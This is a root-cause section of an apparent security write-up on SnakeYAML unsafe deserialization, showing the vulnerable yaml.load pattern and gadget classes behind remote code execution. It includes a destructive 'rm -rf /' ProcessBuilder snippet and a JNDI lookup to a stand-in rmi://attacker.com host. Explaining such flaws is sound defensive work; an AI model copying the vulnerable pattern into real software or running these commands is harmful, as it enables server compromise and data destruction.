== [[root-cause]]Root Cause Analysis

=== The Problem: Unrestricted Class Instantiation

SnakeYAML's default `Constructor` class allows **any Java class on the classpath** to be instantiated during YAML deserialization.

==== Vulnerable Code Pattern

[source,java]
----
// VULNERABLE: No restrictions on what classes can be instantiated
Yaml yaml = new Yaml(new Constructor());
Object obj = yaml.load(userInput);
----

When this code encounters YAML like:
[source,yaml]
----
!!javax.script.ScriptEngineManager [...]
----

It does this:
[source,java]
----
// Pseudocode of what happens internally
String className = "javax.script.ScriptEngineManager";
Class<?> clazz = Class.forName(className);  // Load class from classpath
Constructor<?> constructor = clazz.getConstructor(/* args */);
Object instance = constructor.newInstance(/* args */);  // ← RCE HAPPENS HERE
----

=== Why is This Dangerous?

Certain Java classes execute code when they're instantiated or when their properties are set.

==== Class: javax.script.ScriptEngineManager

[source,java]
----
// When ScriptEngineManager is instantiated, 
// it can be configured to load scripts

ScriptEngineManager manager = new ScriptEngineManager(classLoader);
ScriptEngine engine = manager.getEngineByName("JavaScript");
engine.eval("java.lang.Runtime.getRuntime().exec('whoami')");
----

**Attack surface:** Attacker provides a URLClassLoader that loads malicious code.

==== Class: java.lang.ProcessBuilder

[source,java]
----
// ProcessBuilder executes system commands when instantiated
ProcessBuilder pb = new ProcessBuilder("bash", "-c", "rm -rf /");
pb.start();  // Command executes immediately
----

**Attack surface:** Direct system command execution.

==== Class: com.sun.rowset.JdbcRowSetImpl

[source,java]
----
// JdbcRowSetImpl performs JNDI lookups which can be exploited
JdbcRowSetImpl rs = new JdbcRowSetImpl();
rs.setDataSourceName("rmi://attacker.com:1099/Exploit");
rs.setAutoCommit(true);  // Triggers JNDI lookup
// Attacker returns malicious serialized object → Gadget chain RCE
----

**Attack surface:** JNDI Injection leading to RCE.

=== The Gadget Chain Concept

[cols="1,2,3"]
|===
| Step | Action | Details

| 1
| Attacker sends YAML
| Contains `!!javax.script.ScriptEngineManager`

| 2
| SnakeYAML deserializes
| Creates instance of ScriptEngineManager

| 3
| Constructor executes
| Code runs during object creation/property setting

| 4
| Code downloads payload
| URLClassLoader loads malicious JAR

| 5
| Malicious JAR executes
| Attacker code runs with application privileges

| 6
| RCE Complete
| Server compromised
|===
